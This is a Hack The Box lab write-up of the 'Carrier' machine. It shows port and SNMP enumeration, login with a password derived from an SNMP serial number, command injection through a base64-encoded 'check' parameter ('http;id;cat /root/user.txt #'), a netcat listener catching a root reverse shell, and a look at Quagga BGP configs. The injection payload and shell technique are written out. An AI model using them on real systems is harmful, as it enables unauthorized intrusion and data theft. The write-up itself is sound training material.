---
layout: post
title: Hackthebox Carrier Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-01/carrier_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Carrier" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:/home/sabonawa# nmap -p- 10.10.10.105 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-23 09:22 EEST
Nmap scan report for 10.10.10.105
Host is up (0.037s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.14 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:/home/sabonawa# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.105/ -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.105/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2018/09/23 09:56:07 Starting gobuster
=====================================================
/index.php (Status: 200)
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/tickets.php (Status: 302)
/fonts (Status: 301)
/dashboard.php (Status: 302)
/debug (Status: 301)
/diag.php (Status: 302)
/server-status (Status: 403)
=====================================================
2018/09/23 10:27:10 Finished
=====================================================
{% endhighlight %}

UDP Scanning:
{% highlight shell %}
sabonawa@kali:~$ sudo nmap -sU 10.10.10.105 --top-ports 1000 -sV -sC
[sudo] password for sabonawa: 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-23 18:55 EEST
Nmap scan report for 10.10.10.105
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE VERSION
67/udp  open|filtered dhcps
161/udp open          snmp    SNMPv1 server; pysnmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: pysnmp
|   engineIDFormat: octets
|   engineIDData: 77656201ec7908
|   snmpEngineBoots: 2
|_  snmpEngineTime: 3h09m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1185.70 seconds
{% endhighlight %}

SNMP enumeration:
{% highlight shell %}
sabonawa@kali:~$ snmpwalk -c public -v1 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
{% endhighlight %}

### 2.Getting User
What we can find on port 80 is login console of Lyghtspeed with some Error.
![placeholder](https://inar1.github.io/public/images/2019-03-01/2019-02-26-14-34-23.png)

By looking as /doc, we can figure out what these error code means and there is an interesting line.
![placeholder](https://inar1.github.io/public/images/2019-03-01/2019-02-26-12-54-09.png)

We can guess like "SN" stands for "serial number".<br>
If we try some petterns, we can find this credential for Lyghtspeed

{% highlight shell %}
admin:NET_45JDX23
{% endhighlight %}

After logged in, we can find an interesting page /diag.php.
![placeholder](https://inar1.github.io/public/images/2019-03-01/2019-02-26-13-05-16.png)

Sounds like if we click "verify status" button, we have a result of linux command.
The value which we post is base64 encoded.

{% highlight html %}i
<input type="hidden" id="check" name="check" value="cXVhZ2dh">
<div class="form-group">
    <button type="submit" class="btn btn-primary">
{% endhighlight %}

Decoded value of "cXVhZ2dh" is "quagga" and This is possible RCE vulnerability.<br>
By sending arbitorary code, we can achieve user.txt.

{% highlight shell %}
check=aHR0cDtpZDtjYXQgL3Jvb3QvdXNlci50eHQgIyA=
# http;id;cat /root/user.txt # 
{% endhighlight %}

![placeholder](https://inar1.github.io/public/images/2019-02-24/2019-02-24-13-16-40.png)

### Getting Root
By taking advantage of this RCE, we can easily achieve reverse shell.
{% highlight shell %}
root@kali:/home/sabonawa# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.105] 51590
bash: cannot set terminal process group (2281): Inappropriate ioctl for device
bash: no job control in this shell
root@r1:~# 
{% endhighlight %}

Sounds like we got a root shell. However, we can not find root.txt anywhere.<br>
We already know that <a href="https://www.nongnu.org/quagga/">Quagga</a> is running on this server.<br>
By enumeration, we can find additional servers which is realated to this server.

{% highlight shell %}
root@r1:/etc/quagga# cat bgpd.conf
cat bgpd.conf
!
! Zebra configuration saved from vty
!   2018/07/02 02:14:27
!
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty

root@r1:/etc/quagga# netstat -nlpa
netstat -nlpa
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:2601          0.0.0.0:*               LISTEN      25658/zebra     
tcp        0      0 127.0.0.1:2605          0.0.0.0:*               LISTEN      25662/bgpd      
tcp        0      0 0.0.0.0:179             0.0.0.0:*               LISTEN      25662/bgpd      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      483/sshd        
tcp        0      0 10.99.64.2:22           10.99.64.251:57156      ESTABLISHED 25535/sshd: root@no
tcp        0      0 10.78.10.1:55160        10.78.10.2:179          ESTABLISHED 25662/bgpd      
tcp        0     14 10.99.64.2:58254        10.10.14.23:443         ESTABLISHED 25569/bash      
tcp        0      0 10.78.11.1:57658        10.78.11.2:179          ESTABLISHED 25662/bgpd      
tcp6       0      0 :::179                  :::*                    LISTEN      25662/bgpd      
tcp6       0      0 :::22                   :::*                    LISTEN      483/sshd        
raw6       0      0 :::58                   :::*                    7           25658/zebra     
!
{% endhighlight %}
